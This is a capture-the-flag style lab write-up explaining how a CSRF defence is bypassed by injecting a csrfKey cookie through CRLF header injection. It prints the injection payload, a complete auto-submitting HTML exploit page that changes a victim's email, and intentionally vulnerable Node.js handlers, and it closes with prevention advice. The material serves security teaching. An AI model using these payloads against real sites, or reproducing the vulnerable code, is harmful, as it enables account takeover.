05-CSRF where token is tied to non-session cookie/05-CSRF where token is tied to non-session cookie.md

# 🔥 Lab: CSRF where token is tied to non-session cookie

## 🧠 Lab Concept

This lab demonstrates how CSRF protection can be bypassed when:

* CSRF token is tied to a cookie (`csrfKey`)
* And attacker can inject cookies using CRLF (HTTP Header Injection)

---

## ⚠️ Vulnerability Chain

### 1. CSRF Validation Logic

Server checks:

* `csrf` (POST body)
* `csrfKey` (cookie)

❌ Issue:
Server trusts cookie → attacker can manipulate it

---

### 2. Initial Testing

* Normal CSRF → ❌ Failed
* Used attacker token → partially worked ✅
* Realized: `csrfKey` cookie required

💡 Insight:
If attacker can set victim’s cookie → CSRF bypass possible

---

## 🔥 Exploit Step 1: Cookie Injection (CRLF)

### Injection Point:

```
/?search=deep
```

### Payload:

```
deep%0d%0aSet-Cookie: csrfKey=ATTACKER_TOKEN
```

### Result:

```
HTTP/2 200 OK
Set-Cookie: csrfKey=ATTACKER_TOKEN
```

👉 Victim browser stores attacker-controlled cookie

---

## 🔥 Exploit Step 2: CSRF Attack

Now send request with:

* Attacker’s CSRF token
* Matching `csrfKey` cookie

---

## 🚀 Final Exploit Payload

```html
<html>
  <body>

    <!-- CSRF Form -->
    <form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hacker@evil-user.net" />
      <input type="hidden" name="csrf" value="ATTACKER_TOKEN" />
    </form>

    <!-- Cookie Injection via CRLF -->
    <img src="https://LAB-ID.web-security-academy.net/?search=deep%0d%0aSet-Cookie:%20csrfKey=ATTACKER_TOKEN%3b%20SameSite=None"
         onerror="document.forms[0].submit()">

  </body>
</html>
```

---

## ⚙️ Attack Flow

1. Victim opens malicious page
2. `<img>` sends CRLF payload
3. Server sets:

```
Set-Cookie: csrfKey=attacker_value
```

4. Browser stores cookie
5. Form auto-submits
6. Server validates:

   * csrf ✅
   * csrfKey ✅

🔥 Attack successful

---

## 💻 Vulnerable Backend Code (Example)

### ❌ CSRF Logic

```js
app.post("/my-account/change-email", (req, res) => {
    const csrfToken = req.body.csrf;
    const csrfCookie = req.cookies.csrfKey;

    if (csrfToken === csrfCookie) {
        updateEmail(req.user.id, req.body.email);
        res.send("Email updated");
    } else {
        res.status(403).send("Invalid CSRF token");
    }
});
```

---

### ❌ CRLF Injection Point

```js
app.get("/", (req, res) => {
    const search = req.query.search;

    res.setHeader("Set-Cookie", "LastSearchTerm=" + search);

    res.send("Search results");
});
```

---

## 🧩 Root Cause

* ❌ CSRF token tied to cookie
* ❌ Cookie is attacker-controllable
* ❌ No CRLF sanitization
* ❌ Trusting client-side data for security

---

## 🛡️ Prevention

* ✔️ Store CSRF token server-side (session)
* ✔️ Do not trust cookies for validation
* ✔️ Sanitize input (`\r\n` removal)
* ✔️ Use `SameSite=Strict`
* ✔️ Rotate CSRF tokens

---

## 💬 Key Learning

> If attacker can set the cookie → CSRF protection is broken

---

## 🏁 Tags

```
#csrf
#crlf-injection
#web-security
#bugbounty
#portswigger
#owasp
```

---

## 🎯 Interview Answer

**Q: How did you bypass CSRF?**

I found that the application validated CSRF using both a request parameter and a cookie (`csrfKey`).
Using a CRLF injection vulnerability, I was able to set the victim’s `csrfKey` cookie.
Then I submitted a CSRF request with a matching token, which bypassed the protection.
